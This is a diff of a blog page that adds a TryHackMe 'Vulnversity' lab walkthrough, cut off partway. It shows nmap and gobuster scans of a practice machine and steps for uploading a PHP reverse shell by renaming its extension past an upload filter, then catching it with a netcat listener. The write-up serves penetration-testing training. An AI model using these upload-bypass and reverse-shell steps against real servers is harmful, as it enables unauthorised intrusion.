@@ -78,17 +78,17 @@
     
 
   <div class="post">
-    <h2 class="post-title">Try Hack Me - CC Pen testing </h4>
+    <h2 class="post-title">Try Hack Me - Vulnversity </h4>
     <div class="post-meta">
       
         <span class="post-date">
           <i class="fas fa-calendar-week"></i>
-            Tuesday, Aug 18, 2020
+            Tuesday, Aug 28, 2020
         </span>
       
       <span class="post-author">— Written by atomloop</span>
       
-        <span class="post-read-time">— 11 min read</span>
+        <span class="post-read-time">— 8 min read</span>
 
     
          <img src="https://atomloop.github.io/image/tryhackme/pentesting/cover.png" class="post-cover center" />
@@ -98,7 +98,7 @@
           <thead>
             <tr>
               <td>Room Name</td>
-              <td>Ice</td>
+              <td>Vulnversity</td>
             </tr>
           </thead>
           <tbody>
@@ -117,7 +117,7 @@
            <tbody>
              <tr>
                <td>Points </td>
-               <td>936</td>
+               <td>96</td>
              </tr>
            </tbody>
 
@@ -131,30 +131,147 @@
            <tbody>
              <tr>
                <td> Room Created by </td>
-               <td><a href="https://tryhackme.com/p/Paradox">paradox</a></td>
+               <td><a href="https://tryhackme.com/p/tryhackme">tryhackme</a></td>
              </tr>
            </tbody>
         </table>
 </div>   
-<h3>CC: Pen Testing </h3>
-<p>A crash course on various topics in penetration testing</p>
+<h3>Vulnversity</h3>
+<p>in This Room we can Learn about active recon, web app attacks and privilege escalation.</p>
+
+<h3 style="color: green"> [Task 1] Deploy the machine  </h3>
+
+<p>connect your computer to tryhackme network through openvpn</p>
+<br>
+<p>nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities</p>
+
+<h3 style="color: green">[Task 2] Reconnaissance</h3>
+<pre><code class="language-bash"> kali@kali:~$ nmap -A -sC -sV 10.10.149.154
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 19:44 EDT
+Nmap scan report for 10.10.149.154
+Host is up (0.22s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.#######
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2020-08-27T19:45:04-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported                                                                                                                                                                                                          
+|_  message_signing: disabled (dangerous, but default)                                                                                                                                                                                     
+| smb2-security-mode:                                                                                                                                                                                                                      
+|   2.02:                                                                                                                                                                                                                                  
+|_    Message signing enabled but not required                                                                                                                                                                                             
+| smb2-time:                                                                                                                                                                                                                               
+|   date: 2020-08-27T23:45:03                                                                                                                                                                                                              
+|_  start_date: N/A                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                           
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                             
+Nmap done: 1 IP address (1 host up) scanned in 69.55 seconds  </code></pre>
 
 
+<p>if the flag of nmap is -p-400 means -p is reffers to port -400 refferst to portnumber 1 to 400 . so using this flag nmap will scan port 1 to 400 </p>
+<br>
+<p>Using the nmap flag -n will it not resolve DNS</p>
+
+<h3 style="color: green">[Task 3] Locating directories using GoBuster </h3>
+<p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.and you can use to upload a shell to.</p>
+<br>
+<p> we know that on which port the http server is running its on port 3333. they say that thare is an upload page on the directory. but we dont know the name of the Directory .lets we try to find directory using gobuster   </p>
+<table>
+  <thead><tr><td>GoBuster flag</td><td>Description</td></thead></tr></thead>
+  <tr><td>-e</td><td>Print the full URLs in your console</td></tr>
+  <tr><td>-u</td><td>The target URL</td></tr>
+  <tr><td>-w</td><td>Path to your wordlist</td></tr>
+  <tr><td>-U and -P</td><td>Username and Password for Basic Auth</td></tr>
+  <tr><td>-p <x></td><td>Proxy to use for requests</td></tr>
+    <tr><td>-c <http cookies> </td><td>Specify a cookie for simulating your auth</td></tr>
+</table>
+
+<pre><code class="language-bash">===============================================================
+Atom $ gobuster dir -u http://10.10.149.154:3333/ -w /mnt/c/Users/pounr/Documents/Wind-sub/common.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.149.154:3333/
+[+] Threads:        10
+[+] Wordlist:       /mnt/c/Users/pounr/Documents/Wind-sub/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/28 05:53:59 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/in###### (Status: 301)
+/js (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/08/28 05:56:16 Finished
+===============================================================</code></pre>
+
+<p>on the directory <code>/in#######</code> we got an upload page </p><br>
+<img src="https://atomloop.github.io/image/tryhackme/Vulnversity/Screenshot_2020-08-28 Screenshot.png">
 
 
+<h3 style="color: blue">[Task 4] Compromise the webserver </h3>
+<p>
+In this Task we need to compromise webserver using php-reverse-shell  .php-reverse-shell is a srcipt which helps to gain access the target shell . to do that Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.<br>
 
+This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.
 
+you can found this php-revese-shell <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a>
 
+To gain remote access to this machine, follow these steps:
+<br>
+1. verify that you are connected to tryhackme network using openvpn to conform that you can visit http://10.10.10.10 your will find your vpn tunnel ip . if you not found you are not connected to tryhackme network 
+<br>
+2.make sure that you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
 
+$ip = '127.0.0.1';  // CHANGE THIS   
+$port = 1234;       // CHANGE THIS   
+<br>
+3.rename the php-reverce-shell script into a format which is supported to upload on target web. the default format of this script is .php but this format is not supported by our target .so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or using burpsuit 
+<br>
+<h2>Get Ready to catch the reverse shell</h2>
 
+Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
 
-
-
-
-
+$ nc -v -n -l -p 1234
 
         
-    
+    </p>
       
   </div>
   
